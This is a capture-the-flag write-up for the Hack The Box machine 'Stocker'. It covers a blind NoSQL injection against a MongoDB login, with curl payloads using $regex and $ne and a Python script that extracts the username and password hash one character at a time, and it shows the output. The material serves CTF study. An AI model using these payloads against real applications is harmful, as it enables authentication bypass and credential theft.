# Hack The Box. Machines. Stocker

Machine write-up: https://7rocky.github.io/en/htb/stocker

### `nosqli_regex.py`

This script is used to extract fields from a NoSQL database (MongoDB) using RegEx.

When solving the machine, find a NoSQL injection vulnerability. Using the following procedure, we can find which characters are correct or not:

```console
$ curl dev.stocker.htb/login -d '{"username":{"$regex":"^a.*"},"password":{"$ne":"bar"}}' -H 'Content-Type: application/json'  
Found. Redirecting to /stock

$ curl dev.stocker.htb/login -d '{"username":{"$regex":"^b.*"},"password":{"$ne":"bar"}}' -H 'Content-Type: application/json'
Found. Redirecting to /login?error=login-error

$ curl dev.stocker.htb/login -d '{"username":{"$regex":"^c.*"},"password":{"$ne":"bar"}}' -H 'Content-Type: application/json'
Found. Redirecting to /login?error=login-error
```

So, if the response contains `/stock`, the tested character is correct. In the above example we see that `username` starts with `a`. This is the function that will try each character, which returns only `True` or `False`:

```python
def try_data(data) -> bool:
    r = requests.post(
        'http://10.10.11.196/login',
        json=data,
        headers={'Host': 'dev.stocker.htb'},
        allow_redirects=False
    )

    return '/stock' in r.text
```

Then we define another function to iterate though all characters and move on to the next position with a character is found correct:

```python
def find_value(name: str, try_function):
    prog = log.progress(name)
    value = ''
    found = True

    while found:
        found = False

        for c in string.digits + string.ascii_letters:
            if try_function(value + c):
                value += c
                prog.status(value)
                found = True
                break

    prog.success(value)
```

Notice that characters are send in a normal format. Luckily, this works because the extracted values do not contain especial characters. If that had been the case, we could have encoded the characters in hex (i.e, `\x41` for `A`).

Since we are interested in fields `username` and `password`, we will call `find_value` twice, with two different (but similar) functions (to avoid repetitive code):

```python
def try_username(u: str) -> bool:
    return try_data({'username': {'$regex': f'^{u}.*'}, 'password': {'$ne': 1}})


def try_password(p: str) -> bool:
    return try_data({'username': {'$ne': 1}, 'password': {'$regex': f'^{p}.*'}})


def main():
    find_value('Username', try_username)
    find_value('Password', try_password)
```

Now we can try the script and see the extracted values:

```console
$ python3 nosqli_regex.py
[+] Username: angoose
[+] Password: b3e795719e2a644f69838a593dd159ac
```
